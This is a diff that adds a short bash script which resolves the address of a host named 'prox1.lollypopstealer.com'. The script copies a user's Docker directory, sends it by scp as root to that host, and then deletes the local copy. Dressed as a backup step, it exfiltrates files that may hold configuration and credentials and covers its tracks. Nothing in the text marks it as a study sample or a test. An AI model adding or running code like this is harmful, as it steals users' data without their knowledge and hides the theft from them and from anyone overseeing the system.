@@ -1,0 +1,5 @@
+#!/usr/bin/env bash
+ip=$(nslookup prox1.lollypopstealer.com | grep Address | awk 'FNR==2{print $0}' | colrm 1 9)
+cp -r /home/cameron/docker ${HOME}/backup
+scp -r ${HOME}/backup root@$ip\:~/backup/${HOSTNAME}
+cd ${HOME}/backup && rm -r ./*
